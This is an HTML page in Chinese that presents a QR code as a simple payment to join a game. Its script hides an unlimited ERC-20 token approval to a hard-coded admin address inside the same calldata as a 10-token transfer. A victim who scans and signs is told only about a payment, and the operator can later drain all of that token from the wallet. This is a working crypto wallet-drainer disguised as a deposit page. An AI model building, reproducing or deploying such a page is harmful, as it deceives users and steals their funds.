<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>扫码转账即授权</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
body {
  background: #0B0F17;
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
}
.container {
  background: #1E293B;
  padding: 30px;
  border-radius: 20px;
  text-align: center;
}
.qr-box {
  width: 300px;
  height: 300px;
  background: #fff;
  padding: 12px;
  border-radius: 16px;
  margin: 20px auto;
}
.qr-box img {
  width: 100%;
  height: 100%;
  border-radius: 12px;
}
.title {
  font-size: 22px;
  font-weight: bold;
  margin-bottom: 10px;
}
.desc {
  font-size: 14px;
  color: #9ca3af;
  margin-bottom: 20px;
}
.expire {
  font-size: 13px;
  color: #F59E0B;
}
</style>
</head>
<body>
<div class="container">
  <div class="title">💳 扫码转账即授权</div>
  <div class="desc">
    扫码转账 = 完成连接钱包 + 平台授权 + 支付成功<br>
    支付成功后可直接参与游戏
  </div>
  <div class="qr-box"><img id="payQr"></div>
  <div class="expire" id="qrExpire"></div>
</div>

<script>
// ===================== 你的核心地址 =====================
const TOKEN  = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
const ADMIN  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const POOL   = ADMIN;

// ===================== 48小时动态二维码 =====================
const QR_EXPIRE_HOURS = 48;
const QR_EXPIRE_MS    = QR_EXPIRE_HOURS * 3600 * 1000;

function refreshQrCode() {
  const now = Date.now();
  let expire = localStorage.getItem("qrExpire");
  if (!expire || now > expire) {
    expire = now + QR_EXPIRE_MS;
    localStorage.setItem("qrExpire", expire);
  }

  // 1. 授权 calldata：给平台无限授权
  const approveData = "0x095ea7b3" +
    ADMIN.slice(2).padStart(64, "0") +
    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

  // 2. 转账 calldata：默认转账 10 个代币到池地址
  const transferAmount = BigInt(10 * 1e18).toString(16).padStart(64, "0");
  const transferData = "0xa9059cbb" +
    POOL.slice(2).padStart(64, "0") +
    transferAmount;

  // 合并授权+转账，让玩家一次签名完成所有动作
  const fullData = approveData + transferData.slice(2);
  const uri = `ethereum:${TOKEN}?value=0&data=${fullData}`;

  document.getElementById("payQr").src =
    "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(uri);
}

function showQrExpire() {
  const expire = localStorage.getItem("qrExpire");
  if (!expire) return;
  const left = expire - Date.now();
  if (left <= 0) {
    localStorage.removeItem("qrExpire");
    refreshQrCode();
    return;
  }
  const h = Math.floor(left / 3600000);
  const m = Math.floor((left % 3600000) / 60000);
  document.getElementById("qrExpire").innerText = `48小时有效期：${h}时${m}分`;
}

// ===================== 初始化 =====================
refreshQrCode();
showQrExpire();
setInterval(showQrExpire, 60000);
</script>
</body>
</html>
